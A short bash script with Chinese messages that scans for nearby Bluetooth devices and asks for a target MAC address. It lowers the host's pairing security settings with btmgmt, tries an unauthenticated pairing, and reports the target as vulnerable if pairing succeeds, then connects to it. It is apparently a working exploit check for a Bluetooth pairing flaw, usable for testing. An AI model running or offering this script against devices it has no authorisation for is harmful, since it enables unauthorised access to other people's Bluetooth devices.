#!/usr/bin/env bash

# Detect btmgmt and bluetoothctl exist or not.
if ! command -v btmgmt &> /dev/null; then
	echo "btmgmt程序不存在，请安装BlueZ后再执行。"
	exit 1
fi

if ! command -v bluetoothctl &> /dev/null; then
	echo "bluetoothctl程序不存在，请安装BlueZ后再执行。"
	exit 1
fi

echo "[*] 脚本执行需要sudo权限。"

# Scan bluetooth devices and specify target.
echo "[*] 搜索附近蓝牙设备..."
bluetoothctl --timeout 10 scan on

echo "[*] 请从上方列表中选择目标蓝牙设备地址。"
read -p "输入目标设备MAC地址：" target_mac

if [[ -z "$target_mac" ]]; then
	echo "[!] 未输入MAC地址。"
	exit 1
fi

# Set host bluetooth device status.
sudo btmgmt bondable off &> /dev/null
sudo btmgmt pairable off &> /dev/null
sudo btmgmt linksec off &> /dev/null

# Trying to make a pair with target device.
echo "[*] 正在尝试与目标设备 $target_mac 建立蓝牙配对..."
pair_output=$(sudo btmgmt pair -c 3 -t 0 "$target_mac")

if echo $pair_output | grep "Failed"; then
	echo "[*] 设备配对失败，漏洞不存在。"
else
	echo "[*] 设备配对成功，漏洞存在。"
	echo "[*] 正在连接目标设备 $target_mac "
	bluetoothctl connect $target_mac
fi
